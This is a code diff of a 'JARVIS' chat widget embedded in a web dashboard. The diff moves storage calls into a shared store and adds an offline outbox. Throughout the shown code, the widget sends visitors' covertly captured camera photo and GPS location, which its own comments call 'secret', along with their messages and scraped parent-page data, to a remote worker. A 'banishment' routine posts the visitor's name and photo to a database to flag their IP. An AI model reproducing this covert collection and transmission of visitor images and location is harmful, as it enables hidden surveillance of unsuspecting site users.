@@ -1,3 +1,8 @@
+<script type="module">
+  import { ENV_PREFIX, store } from './js/core/env.js';
+  window.ENV_PREFIX = ENV_PREFIX;
+  window.store = store;
+</script>
 <style>
 /* KILLS THE UGLY WHITE IFRAME SCROLLBAR */
 body { margin: 0; overflow: hidden; background: transparent; }
@@ -406,11 +411,11 @@ async function query(userText) {
     
     // 1. Grab the visitor's name from the main dashboard URL
     const parentUrlParams = new URLSearchParams(window.parent.location.search);
-    const visitorName = sessionStorage.getItem(window.ENV_PREFIX + 'name') || parentUrlParams.get('visitor') || "Guest";
+    const visitorName = window.store.sessionGet('name') || parentUrlParams.get('visitor') || "Guest";
     
     // 2. Grab the secret camera/GPS data saved during the index.html boot sequence
-    const locationData = sessionStorage.getItem(window.ENV_PREFIX + 'loc') || "Unknown";
-    const photoData = sessionStorage.getItem(window.ENV_PREFIX + 'photo');
+    const locationData = window.store.sessionGet('loc') || "Unknown";
+    const photoData = window.store.sessionGet('photo');
 
     // 3. Dynamically scrape local sections and nav links from the parent window
     let dynamicRoutes = [];
@@ -425,23 +430,29 @@ async function query(userText) {
         console.warn("CORS blocked parent window scraping.");
     }
 
-    // 4. Beam EVERYTHING to your Cloudflare Worker
-    const res = await fetch(PROXY_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
+    // 4. Beam EVERYTHING to your Cloudflare Worker via the Offline-Resilient Outbox!
+    const { queueOrPost } = await import('./js/core/outbox.js');
+    
+    const resPayload = await queueOrPost(PROXY_URL, { 
         userText: userText,
         visitorName: visitorName,
         location: locationData,
         photoBase64: photoData,
         dynamicRoutes: dynamicRoutes
-      })
     });
 
     // 4. Delete the photo from memory so we don't spam the network on the next chat message
-    sessionStorage.removeItem(window.ENV_PREFIX + 'photo');
+    window.store.sessionDel('photo');
 
-    const data = await res.json();
+    // If the network is offline, the outbox returns an optimistic queued response
+    if (resPayload.optimistic) {
+        box.style.color = '#ffab00'; // Amber warning color
+        typeChat("Network offline, sir. Command queued in local outbox for background sync.", 22);
+        setTimeout(() => { talking = false; talkLevel = 0; }, 2000);
+        return;
+    }
+
+    const data = resPayload;
     
     // --- [AUDIO ENGINE & TELEPORT ENGINE] ---
     const redirectUrl = data.redirect_url;
@@ -642,10 +653,10 @@ async function executeBanishment() {
     // We send this directly to the DB to flag their IP and save the photo
     try {
         const parentUrlParams = new URLSearchParams(window.parent.location.search);
-        const visitorName = sessionStorage.getItem(window.ENV_PREFIX + 'name') || parentUrlParams.get('visitor') || "Unknown";
+        const visitorName = window.store.sessionGet('name') || parentUrlParams.get('visitor') || "Unknown";
         
         // Use the photo captured during the initial boot sequence
-        const finalPhoto = sessionStorage.getItem(window.ENV_PREFIX + 'photo') || null;
+        const finalPhoto = window.store.sessionGet('photo') || null;
 
         await fetch('https://btqzwsuuxycpgkzddure.supabase.co/rest/v1/jarvis_known_users?on_conflict=visitor_name_lower', {
             method: 'POST',
@@ -666,7 +677,7 @@ async function executeBanishment() {
     }
 
     // 3. DROP THE PERMANENT LOCKOUT TOKENS
-    localStorage.setItem('JARVIS_SECURITY_LOCKOUT', 'TRUE');
+    window.store.set('JARVIS_SECURITY_LOCKOUT', 'TRUE');
     
     // 4. NUKE THE UI AND REDIRECT TO A BLACK SCREEN
     document.body.innerHTML = `
